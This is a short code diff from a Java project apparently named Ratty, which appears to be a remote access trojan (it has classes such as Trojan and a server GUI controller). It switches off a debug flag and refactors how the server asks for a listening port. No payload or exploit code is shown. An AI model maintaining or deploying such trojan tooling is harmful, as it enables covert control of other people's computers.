@@ -25,7 +25,7 @@ import de.sogomn.rat.server.gui.RattyGuiController;
  */
 public final class Ratty {
 	
-	public static final boolean DEBUG = true;
+	public static final boolean DEBUG = false;
 	public static final String VERSION = "1.3";
 	public static final ResourceBundle LANGUAGE = ResourceBundle.getBundle("language.lang");
 	
@@ -104,12 +104,6 @@ public final class Ratty {
 		}
 	}
 	
-	private static int getPortInput() {
-		final String input = JOptionPane.showInputDialog(PORT_INPUT_QUESTION);
-		
-		return parsePort(input);
-	}
-	
 	public static void connectToHost(final String address, final int port) {
 		final ActiveConnection newClient = new ActiveConnection(address, port);
 		final Trojan trojan = new Trojan();
@@ -175,7 +169,13 @@ public final class Ratty {
 					System.out.println(PORT_ERROR_MESSAGE);
 				}
 			} else {
-				final int port = getPortInput();
+				final String input = JOptionPane.showInputDialog(PORT_INPUT_QUESTION);
+				
+				if (input == null) {
+					return;
+				}
+				
+				final int port = parsePort(input);
 				
 				if (port != -1) {
 					startServer(port, true);
